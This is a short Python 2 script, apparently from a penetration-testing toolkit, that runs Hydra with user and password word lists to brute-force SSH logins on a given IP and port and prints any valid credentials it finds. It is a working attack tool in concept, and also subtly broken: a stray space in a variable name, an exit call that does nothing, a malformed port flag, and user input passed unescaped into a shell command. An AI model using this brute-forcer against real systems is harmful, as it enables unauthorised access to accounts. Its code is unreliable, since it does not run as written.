#!/usr/bin/env python
#Runs a user word list and a pass word list against IP and port specified
#
#
import subprocess
import sys

#Describes the usage if user input/usage is incorrect

if len(sys.argv) != 3:
    print "Usage: sshrecon.py <ip address> <port>"
    sys.exit

#Declare the variables for user input

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

print "INFO: Performing Hydra ssh scan against " + ip_ address

HYDRA = "hydra -L /root/Desktop/wordlists/userlist -P /root/Desktop/wordlists/passlist -f -o /root/Desktop/results/%s_sshhydra.txt -u %s -%s ssh" % (ip_address, ip_address, port)
try:
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
            print "[*] Valid ssh creds found: " + result
except:
    print "INFO: No valid ssh creds found"
